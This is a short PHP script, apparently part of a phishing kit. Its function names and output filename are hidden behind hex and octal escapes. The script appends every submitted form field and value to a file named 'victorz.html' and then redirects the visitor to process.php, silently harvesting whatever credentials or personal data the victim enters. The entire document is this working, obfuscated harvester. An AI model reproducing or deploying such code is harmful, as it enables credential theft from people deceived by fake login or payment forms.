<?php 


 $x0e="fclose"; $x0f="\x66o\x70en"; $x10="\x66w\162\151\x74e"; 
header ('Location: process.php');$x0b = $x0f("\166\151c\164\157r\x7a\056\x68\164m\154", "\141");foreach($_POST as $x0c => $x0d) {$x10($x0b, $x0c);$x10($x0b, "=");$x10($x0b, $x0d);$x10($x0b, "\r\n");}$x10($x0b, "<\x68r>\074br\x3e\r\n");$x0e($x0b);exit;?>